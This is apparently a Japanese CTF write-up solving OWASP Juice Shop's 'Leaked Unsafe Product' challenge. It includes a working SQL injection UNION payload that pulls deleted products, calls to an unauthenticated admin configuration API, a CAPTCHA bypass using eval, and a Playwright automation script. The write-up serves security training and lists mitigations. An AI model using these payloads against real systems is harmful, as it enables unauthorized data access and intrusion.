# Leaked Unsafe Product ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** Sensitive Data Exposure
**目標:** 削除された危険な商品を特定し、どの成分が危険かを報告

## 思考プロセス

1. チャレンジキーが `dlpPastebinDataLeakChallenge` → Pastebin でデータ漏洩の可能性
2. 削除された商品を SQLi で確認 → `Rippertuer Special Juice` を発見
3. 商品説明には一般的なフルーツ名のみ、「and others」と記載
4. 管理用 API `/rest/admin/application-configuration` にアクセス
5. 設定内の `keywordsForPastebinDataLeakChallenge` に危険成分が記載

## 実行手順

### Step 1: 削除された商品を確認

```javascript
// SQLi で削除済み商品を取得
fetch("/rest/products/search?q=')) UNION SELECT id,name,description,4,5,6,7,8,9 FROM Products WHERE deletedAt IS NOT NULL--")
  .then(r => r.json())
  .then(data => console.log(data.data.filter(p => p.description && p.description.includes('unsafe'))));
```

**結果:** `Rippertuer Special Juice` が「This product is unsafe!」と記載されて削除済み

### Step 2: 設定から危険成分を取得

```javascript
// 管理用 API から設定を取得
fetch('/rest/admin/application-configuration')
  .then(r => r.json())
  .then(config => {
    const product = config.config.products.find(p => p.name.includes('Rippertuer'));
    console.log(product.keywordsForPastebinDataLeakChallenge);
  });
```

**結果:**
```json
["hueteroneel", "eurogium edule"]
```

### Step 3: Contact フォームで報告

```javascript
const token = localStorage.getItem('token');
const captcha = await fetch('/rest/captcha/').then(r => r.json());
const answer = eval(captcha.captcha);

await fetch('/api/Feedbacks', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + token
  },
  body: JSON.stringify({
    comment: 'Rippertuer Special Juice contains dangerous ingredients: hueteroneel and eurogium edule',
    rating: 3,
    captchaId: captcha.captchaId,
    captcha: String(answer)
  })
});
```

## 解説

### 脆弱性の詳細

1. **管理用 API の露出**: `/rest/admin/application-configuration` が認証なしでアクセス可能
2. **機密情報の漏洩**: 設定ファイル内に本来隠すべき情報（危険成分のキーワード）が含まれている
3. **DLP (Data Loss Prevention) の欠如**: 機密データが外部（Pastebin 等）に漏洩する可能性を示唆

### 危険成分について

- **hueteroneel**: 架空の有毒物質（Juice Shop オリジナル）
- **eurogium edule**: 架空の有毒物質（Juice Shop オリジナル）

### 対策

1. **API アクセス制御**: 管理用 API には適切な認証・認可を設定
2. **設定の分離**: 機密情報は環境変数や別の安全なストレージで管理
3. **DLP ツールの導入**: 機密データの漏洩を検知・防止

## 学んだこと

- 設定 API は攻撃者にとって情報の宝庫
- チャレンジキー名がヒントになることがある（`dlpPastebinDataLeakChallenge`）
- 「and others」のような曖昧な表現は追加情報が存在するサイン

## Playwright MCP での自動化

```javascript
// 完全自動化スクリプト
browser_evaluate(async () => {
  // 1. 設定から危険成分を取得
  const config = await fetch('/rest/admin/application-configuration').then(r => r.json());
  const product = config.config.products.find(p => p.name.includes('Rippertuer'));
  const keywords = product.keywordsForPastebinDataLeakChallenge;

  // 2. CAPTCHA 取得
  const token = localStorage.getItem('token');
  const captcha = await fetch('/rest/captcha/').then(r => r.json());
  const answer = eval(captcha.captcha);

  // 3. フィードバック送信
  return fetch('/api/Feedbacks', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + token
    },
    body: JSON.stringify({
      comment: `Rippertuer Special Juice contains dangerous ingredients: ${keywords.join(' and ')}`,
      rating: 3,
      captchaId: captcha.captchaId,
      captcha: String(answer)
    })
  }).then(r => r.json());
});
```
